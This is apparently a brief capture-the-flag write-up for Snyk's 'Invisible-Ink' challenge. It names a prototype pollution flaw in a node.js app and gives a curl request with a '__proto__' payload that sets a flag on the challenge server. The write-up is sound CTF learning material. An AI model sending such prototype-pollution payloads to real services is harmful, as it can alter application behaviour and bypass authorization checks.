# Challenge Invisble-Ink from Snyk


## Solution

snyk test


this reveals, that there is a prototype pollution attack in node.js 


$ curl --request POST --header "Content-Type: application/json"  http://invisible-ink.c.ctf-snyk.io/echo -d '{"message":"ping", "__proto__":{"flag":true}}' | jq .
